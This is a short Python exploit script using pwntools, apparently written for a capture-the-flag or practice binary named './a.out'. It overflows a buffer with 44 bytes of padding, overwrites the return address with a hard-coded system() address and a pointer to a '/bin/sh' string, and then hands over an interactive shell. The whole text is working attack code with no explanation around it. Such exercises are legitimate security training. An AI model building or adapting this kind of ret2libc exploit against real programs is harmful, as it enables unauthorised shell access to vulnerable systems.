from pwn import *
"""
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x20\xa4\xe1\xf7BBBB\x08\x90\x55\x56
"""

offset = 44
sys_addr = "\x20\xa4\xe1\xf7"
sys_ret_addr = "BBBB"
bin_sh_str_addr = "\x08\x90\x55\x56"

p = process("./a.out")
p.sendline("A"*offset+sys_addr+sys_ret_addr+bin_sh_str_addr)
p.interactive()
